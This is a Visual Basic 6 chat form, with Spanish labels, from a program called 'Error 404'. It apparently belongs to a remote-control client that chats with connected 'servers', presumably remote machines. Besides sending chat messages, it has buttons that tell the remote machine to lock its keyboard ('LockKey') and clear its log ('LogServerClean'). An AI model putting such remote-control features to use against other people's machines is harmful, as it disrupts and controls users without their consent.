VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{6B7E6392-850A-101B-AFC0-4210102A8DA7}#1.3#0"; "COMCTL32.OCX"
Begin VB.Form frmChat 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Error 404 - Chat"
   ClientHeight    =   5415
   ClientLeft      =   45
   ClientTop       =   645
   ClientWidth     =   11535
   Icon            =   "frmChat.frx":0000
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5415
   ScaleWidth      =   11535
   StartUpPosition =   2  'CenterScreen
   Begin MSComDlg.CommonDialog CD 
      Left            =   7680
      Top             =   240
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   0  'None
      Height          =   5295
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   11415
      Begin VB.Timer tmrForm 
         Interval        =   1
         Left            =   7200
         Top             =   240
      End
      Begin ComctlLib.ListView LV 
         Height          =   4335
         Left            =   8880
         TabIndex        =   7
         Top             =   120
         Width           =   2535
         _ExtentX        =   4471
         _ExtentY        =   7646
         View            =   3
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         _Version        =   327682
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   1
         NumItems        =   1
         BeginProperty ColumnHeader(1) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "Servidores"
            Object.Width           =   4471
         EndProperty
      End
      Begin VB.TextBox txtLog 
         Height          =   3975
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   3
         Top             =   120
         Width           =   8415
      End
      Begin VB.TextBox txtSend 
         Height          =   285
         Left            =   120
         TabIndex        =   2
         Top             =   4200
         Width           =   7095
      End
      Begin VB.CommandButton cmdSend 
         Caption         =   "Enviar"
         Height          =   255
         Left            =   7320
         TabIndex        =   1
         Top             =   4200
         Width           =   1215
      End
      Begin VB.Frame Frame2 
         BackColor       =   &H00FFFFFF&
         Height          =   735
         Left            =   120
         TabIndex        =   4
         Top             =   4560
         Width           =   8415
         Begin VB.CommandButton cmdServerClean 
            Caption         =   "Limpiar Servidor"
            Height          =   375
            Left            =   1560
            TabIndex        =   9
            Top             =   240
            Width           =   1335
         End
         Begin VB.CommandButton cmdClientClean 
            Caption         =   "Limpiar Cliente"
            Height          =   375
            Left            =   120
            TabIndex        =   8
            Top             =   240
            Width           =   1335
         End
         Begin VB.CommandButton cmdSave 
            Caption         =   "Guardar"
            Height          =   375
            Left            =   6960
            TabIndex        =   6
            Top             =   240
            Width           =   1335
         End
         Begin VB.CommandButton cmdLockKey 
            Caption         =   "Block Teclas"
            Height          =   375
            Left            =   3000
            TabIndex        =   5
            Top             =   240
            Width           =   1335
         End
      End
   End
   Begin VB.Menu mnuChatAddServers 
      Caption         =   "Añadir Servidores al Chat"
   End
   Begin VB.Menu mnuChatOptions 
      Caption         =   "Opciones"
   End
   Begin VB.Menu mnuChatTerminateChat 
      Caption         =   "Terminar Chat"
   End
End
Attribute VB_Name = "frmChat"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim IDF As String
Dim ClientNick As String
Dim NumAddServers As Byte, NumOptions As Byte
Dim vName As String
Option Explicit

Private Sub cmdClientClean_Click()
txtLog.Text = ""
End Sub

Private Sub cmdSend_Click()
txtLog.Text = txtLog.Text & vbCrLf & vbCrLf & Time & " " & ClientNick & " dice:" & vbCrLf & "    " & txtSend.Text
Send "msgChat|" & txtSend.Text
txtSend.Text = ""
txtSend.SetFocus
End Sub

Private Sub cmdSave_Click()
Dim Linea As String
CD.DialogTitle = "Guardar Conversacion del Chat"
CD.Filter = "Archivos de Texto(.txt)|*.txt"
CD.ShowSave
    If CD.FileName = "" Then
      Exit Sub
    Else
    If txtLog = "" Then
        MsgBox "No hay conversacion para guardar.", vbExclamation, "Error 404"
      Exit Sub
    End If
Open CD.FileName For Output As #1
Print #1, txtLog
Close
End If
End Sub

Private Sub cmdLockKey_Click()
Send "LockKey"
End Sub

Private Sub cmdServerClean_Click()
Send "LogServerClean"
End Sub

Private Sub Form_Load()
On Error Resume Next
Dim ChatData As String
vName = frmMain.LV.SelectedItem.Text
NumAddServers = 0
NumOptions = 0
Me.Caption = "Chat con " & vName
Me.Height = 5295
Me.Width = 8745

If frmChatConfig.txtWindowTitle.Text = "" Then Me.Caption = "Error 404 - Chat [" & frmMain.LV.SelectedItem & "]" Else Me.Caption = frmChatConfig.txtWindowTitle.Text
If frmChatConfig.txtClientNick.Text = "" Then ClientNick = "Cliente" Else ClientNick = frmChatConfig.txtClientNick.Text
txtLog.BackColor = frmChatConfig.cmdFondoColor.BackColor
'txtLogServerFondoColor_
txtLog.ForeColor = frmChatConfig.cmdTextColor.BackColor
'txtLogServerTextColor
Send "ChatData|" & frmChatConfig.txtServerNick.Text & "|" & frmChatConfig.txtClientNick.Text & "|" & frmChatConfig.txtWindowTitle & "|" & frmChatConfig.cmdFondoColor.BackColor & "|" & frmChatConfig.cmdTextColor.BackColor

Unload frmChatConfig
End Sub

Private Sub Form_Unload(Cancel As Integer)
Send "UnloadChat"
Unload Me
End Sub

Private Sub mnuChatAddServers_Click()
Me.Height = 5295
NumOptions = 0
    If NumAddServers = 0 Then
        IDF = "AddServers1"
        NumAddServers = 1
      Exit Sub
    End If
    If NumAddServers = 1 Then
        IDF = "AddServers0"
        NumAddServers = 0
      Exit Sub
    End If
End Sub

Private Sub mnuChatOptions_Click()
Me.Width = 8745
NumAddServers = 0
If NumOptions = 0 Then
        IDF = "Options1"
        NumOptions = 1
      Exit Sub
    End If
    If NumOptions = 1 Then
        IDF = "Options0"
        NumOptions = 0
      Exit Sub
    End If
End Sub

Private Sub mnuChatTerminateChat_Click()
Send "UnloadChat"
Unload Me
End Sub

Private Sub txtSend_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then
KeyAscii = 0
Call cmdSend_Click
End If
End Sub

Private Sub tmrForm_Timer()
On Error GoTo Error
Select Case IDF
Case "AddServers1"
        If Me.Width = 11625 Then
            IDF = ""
          Exit Sub
        End If
    Me.Width = Me.Width + 360
Case "AddServers0"
        If Me.Width = 8745 Then
            IDF = ""
          Exit Sub
        End If
    Me.Width = Me.Width - 360
Case "Options1" '5295
        If Me.Height = 6135 Then
            IDF = ""
          Exit Sub
        End If
    Me.Height = Me.Height + 140
Case "Options0"
        If Me.Height = 5295 Then
            IDF = ""
          Exit Sub
        End If
    Me.Height = Me.Height - 140
End Select

    If LV.ListItems.Count = frmMain.LV.ListItems.Count Then
      Exit Sub
    Else
        LV.ListItems.Add , , frmMain.LV.ListItems.Item(LV.ListItems.Count + 1)
    End If
Exit Sub
Error:
    Unload Me
End Sub
